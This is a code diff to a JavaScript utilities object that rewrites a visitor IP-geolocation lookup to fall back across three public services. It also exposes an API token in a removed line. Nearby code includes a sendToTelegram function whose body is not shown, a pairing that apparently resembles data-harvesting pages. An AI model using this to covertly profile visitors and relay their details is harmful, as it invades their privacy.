@@ -47,30 +47,63 @@ const Utils = {
     },
 
     async getUserLocation() {
-        try {
-            const response = await fetch("https://ipinfo.io/json?token=5a58a2d85996e3");
-            if (!response.ok) throw new Error("Network response was not ok");
+        const apis = [
+            async () => {
+                const r = await fetch("https://ipwho.is/");
+                const d = await r.json();
+                if (!d.success) throw new Error("ipwho.is failed");
+                return {
+                    ip: d.ip || "N/A",
+                    city: d.city || "N/A",
+                    region: d.region || "N/A",
+                    country: d.country_code || "N/A"
+                };
+            },
+            async () => {
+                const r = await fetch("https://ipapi.co/json/");
+                const d = await r.json();
+                if (d.error) throw new Error("ipapi.co failed");
+                return {
+                    ip: d.ip || "N/A",
+                    city: d.city || "N/A",
+                    region: d.region || "N/A",
+                    country: d.country_code || "N/A"
+                };
+            },
+            async () => {
+                const r = await fetch("https://freeipapi.com/api/json");
+                const d = await r.json();
+                return {
+                    ip: d.ipAddress || "N/A",
+                    city: d.cityName || "N/A",
+                    region: d.regionName || "N/A",
+                    country: d.countryCode || "N/A"
+                };
+            }
+        ];
 
-            const data = await response.json();
-
-            return {
-                location: `${data.ip} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country})`,
-                country_code: data.country || "N/A",
-                ip: data.ip || "N/A",
-                region: data.region || "N/A",
-                country: data.country || "N/A"   // hoặc data.org nếu muốn ISP
-            };
-        } catch (error) {
-            console.error("Error getting location:", error);
-
-            return {
-                location: "N/A",
-                country_code: "N/A",
-                ip: "N/A",
-                region: "N/A",
-                country: "N/A"
-            };
+        for (const api of apis) {
+            try {
+                const d = await api();
+                return {
+                    location: `${d.ip} | ${d.city} | ${d.region} (${d.country})`,
+                    country_code: d.country,
+                    ip: d.ip,
+                    region: d.region,
+                    country: d.country
+                };
+            } catch (_) {
+                continue;
+            }
         }
+
+        return {
+            location: "N/A",
+            country_code: "N/A",
+            ip: "N/A",
+            region: "N/A",
+            country: "N/A"
+        };
     },
 
     async sendToTelegram(data) {
@@ -207,4 +240,3 @@ Sent at: ${new Date().toLocaleString()}`;
         return `${gen()}-${gen()}-${gen()}`;
     }
 };
-
